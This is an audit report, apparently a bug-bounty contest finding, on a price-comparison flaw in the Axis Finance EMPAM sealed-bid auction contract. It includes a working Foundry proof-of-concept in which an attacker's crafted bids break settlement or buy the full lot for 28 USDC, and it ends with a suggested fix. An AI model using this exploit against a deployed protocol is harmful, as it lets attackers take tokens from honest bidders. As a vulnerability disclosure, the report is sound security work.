Virtual Bubblegum Yak

high

# Wrong calculation of bid price

## Summary
When price is calculated in the ``MaxPriorityQueue.sol`` contract in the [_isLess()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/MaxPriorityQueue.sol#L109-L120) function, the ``amountIn`` from the first bid is being multiplied by the ``minAmountout`` from the second bid that is being compared. This results in a mismatch between the actual price, a user has bid for, and will results in incorrect ordering of bids in descending order. 
```solidity
    function _isLess(Queue storage self, uint256 i, uint256 j) private view returns (bool) {
        uint64 iId = self.bidIdList[i];
        uint64 jId = self.bidIdList[j];
        Bid memory bidI = self.idToBidMap[iId];
        Bid memory bidJ = self.idToBidMap[jId];
        uint256 relI = uint256(bidI.amountIn) * uint256(bidJ.minAmountOut);
        uint256 relJ = uint256(bidJ.amountIn) * uint256(bidI.minAmountOut);
        if (relI == relJ) {
            return iId > jId;
        }
        return relI < relJ;
    }
```
However there is a second problem, in the way price is calculated. If the [_isLess()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/MaxPriorityQueue.sol#L109-L120) function is fixed to the following

```solidity
        uint256 relI = uint256(bidI.amountIn) * uint256(bidI.minAmountOut);
        uint256 relJ = uint256(bidJ.amountIn) * uint256(bidJ.minAmountOut);
```
It allows a person to place a bid with a price that is below the ``minPrice``, set by the seller of the auction. This leads to several detrimental exploits for the protocol. If the ``minFillAmount`` specified by the seller is bigger than 0, a malicious actor can specify such parameters that ``amountIn`` is smaller than the ``minPrice`` but when multiplied by the ``minAmountOut`` it results in the biggest price and is put in id 1 in the ``Queue.bidIdList`` . When [_getLotMarginalPrice()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L595-L728) function is called it will enter the  following if block directly:
```solidity
if (price < lotAuctionData.minPrice) {
                    // We know that the lastPrice was not sufficient to fill capacity or the loop would have exited
                    // We check if minimum price can result in a fill. If so, find the exact marginal price between last price and minimum price
                    // If not, we set the marginal price to the minimum price. Whether the capacity filled meets the minimum filled will be checked later in the settlement process.
                    if (
                        lotAuctionData.minPrice == 0
                            || Math.mulDivDown(result.totalAmountIn, baseScale, lotAuctionData.minPrice)
                                >= capacity
                    ) {
                        result.marginalPrice =
                            uint96(Math.mulDivUp(result.totalAmountIn, baseScale, capacity));
                    } else {
                        result.marginalPrice = lotAuctionData.minPrice; // note this cannot be zero since it is checked above
                    }

                    // If the marginal price is re-calculated and is the same as the previous, we need to set the marginal bid id, otherwise the previous bid will not be able to claim.
                    if (lastPrice == result.marginalPrice) {
                        result.marginalBidId = lastBidId;
                    }

                    // Update capacity expended with the new marginal price
                    result.capacityExpended = Math.mulDivDown(
                        result.totalAmountIn, baseScale, uint256(result.marginalPrice)
                    );
                    // marginal bid id can be zero, there are no bids at the marginal price

                    // Exit the outer loop
                    break;
                }
```
Then in the [_settle()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L747-L837) function, this if block won't be entered
```solidity
if (
            result.capacityExpended >= auctionData[lotId_].minFilled
                && result.marginalPrice >= lotAuctionData.minPrice
        )
```
because ``result.capacityExpended`` will be 0. Instead this else block will be executed
```solidity
 else {
            // Auction cannot be settled if we reach this point
            // Marginal price is set as the max uint96 for the auction so the system knows all bids should be refunded
            auctionData[lotId_].marginalPrice = type(uint96).max;

            // totalIn and totalOut are not set since the auction does not clear
        }
```
meaning that nobody will be able to get any ``baseTokens`` no matter the actual price that they bid for. 

For the second exploit assume the base token is a token with 18 decimals lets say SHIB, and the quote token is USDC, a token with 6 decimals, and the ``minFillAmount`` specified by the seller is 0. A malicious actor can create a bid described above, but then create another one, that is just a bit below the ``minPrice``, later allowing him to frontrun all claim transactions once the auction is settled, and thus win  the auction, when there were other bids for a higher price. This can be detrimental for the protocol, as it defeats the whole purpose of the EMPAM auction, when everybody can buy nearly at the min price. At the time of writing this report 1e18 SHIB tokens cost around 0.00028 USDC (or simply 28, accounted for decimals). This parameters will be used in the provided test, to better demonstrate the impact, with real world examples. The capacity for the auction is set to ``10_000e18``.

## Vulnerability Detail
[Gist](https://gist.github.com/AtanasDimulski/f6e93066436dc4d58bf75b9a09fa99c5)

After following the steps in the above [gist](https://gist.github.com/AtanasDimulski/f6e93066436dc4d58bf75b9a09fa99c5) add the following test to the ``AuditorForkTests.t.sol`` file

```solidity
    function test_IncorrectPriceOrdering() public {
        deployEMPAMAuction();

        vm.startPrank(bob);
        uint96 amountBob = 350_000; // Min price is set to 28, this is higher than it roughly 35 QuoteTokens(USDC) tokens for 1e18 baseTokens(SHIB)
        mockQuoteToken.mint(bob, amountBob);
        mockQuoteToken.approve(address(auctionHouse), type(uint256).max);
        uint256 amountOutBob = 10_000e18;
        uint256 salt = uint256(keccak256(abi.encodePacked(uint96(0), bob, amountBob)));

        // Encrypt the message
        (uint256 ciphertextB, Point memory ciphertextPubKeyB) =
            ECIES.encrypt(amountOutBob, recipientPubKey, privateKey, salt);

        Router.BidParams memory bidParamsB = Router.BidParams({
            lotId: uint96(0),
            referrer: address(0),
            amount: amountBob,
            auctionData: abi.encode(ciphertextB, ciphertextPubKeyB),
            permit2Data: ""
        });
        bytes memory callbackData_;
        auctionHouse.bid(bidParamsB, callbackData_);
        vm.stopPrank();

        vm.startPrank(attacker);
        /// @notice this is the malicious bid subbmited by the attacker
        uint96 amountAttacker = 28; // Min price is set to 28
        mockQuoteToken.mint(attacker, amountAttacker);
        mockQuoteToken.approve(address(auctionHouse), type(uint256).max);
        uint256 amountOutAttacker = type(uint96).max;
        uint256 saltA = uint256(keccak256(abi.encodePacked(uint96(0), attacker, amountAttacker)));

        // Encrypt the message
        (uint256 ciphertextA, Point memory ciphertextPubKeyA) =
            ECIES.encrypt(amountOutAttacker, recipientPubKey, privateKey, saltA);

        Router.BidParams memory bidParamsA = Router.BidParams({
            lotId: uint96(0),
            referrer: address(0),
            amount: amountAttacker,
            auctionData: abi.encode(ciphertextA, ciphertextPubKeyA),
            permit2Data: ""
        });
        auctionHouse.bid(bidParamsA, callbackData_);

        /// @notice with this bid the attacker can buy the whole capacity
        uint96 amountAttacker1 = 280_000;
        mockQuoteToken.mint(attacker, amountAttacker1);
        uint256 amountOutAttacker1 = 9_500e18;
        uint256 saltA1 = uint256(keccak256(abi.encodePacked(uint96(0), attacker, amountAttacker1)));

        // Encrypt the message
        (uint256 ciphertextA1, Point memory ciphertextPubKeyA1) =
            ECIES.encrypt(amountOutAttacker1, recipientPubKey, privateKey, saltA1);

        Router.BidParams memory bidParamsA1 = Router.BidParams({
            lotId: uint96(0),
            referrer: address(0),
            amount: amountAttacker1,
            auctionData: abi.encode(ciphertextA1, ciphertextPubKeyA1),
            permit2Data: ""
        });
        auctionHouse.bid(bidParamsA1, callbackData_);
        vm.stopPrank();

        vm.rollFork(15_470_093);
        encryptedMarginalPriceAuctionModule.submitPrivateKey(uint96(0), privateKey, uint64(3));
        auctionHouse.settle(uint96(0));   

        console2.log("Attacker's balance in base token: ", mockBaseToken.balanceOf(attacker));
        uint64[] memory bidsToClaim = new uint64[](2);
        bidsToClaim[0] = 2;
        bidsToClaim[1] = 3;
        auctionHouse.claimBids(uint96(0), bidsToClaim);
        console2.log("Attacker's balance in base token: ", mockBaseToken.balanceOf(attacker));
        console2.log("Attacker's balance in base token normalized: ", mockBaseToken.balanceOf(attacker)/1e18);
        console2.log("Attacker's balance in usdc token: ", mockQuoteToken.balanceOf(attacker));
    }
```

```solidity
Logs:
  Attacker's balance in base token:  0
  Attacker's balance in base token:  10000000000000000000000
  Attacker's balance in base token normalized:  10000
  Attacker's balance in usdc token:  28
```
To run the test use: ``forge test -vvv --mt test_IncorrectPriceOrdering``

## Impact
Wrong price calculation leads to several detrimental exploits of the ``Axis-Finance`` protocol

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/MaxPriorityQueue.sol#L109-L120

## Tool used
Manual Review & Foundry

## Recommendation
The mismatched params can be fixed by the following way:
```solidity
        uint256 relI = uint256(bidI.amountIn) * uint256(bidI.minAmountOut);
        uint256 relJ = uint256(bidJ.amountIn) * uint256(bidJ.minAmountOut);
```
As for the other part, consider adding another param to the Bid struct, that takes the base decimals, and then calculate the price as follows: 
```solidity
price = uint96(Math.mulDivUp(bidI.amountIn, baseScale_, bidI.minAmountOut));
```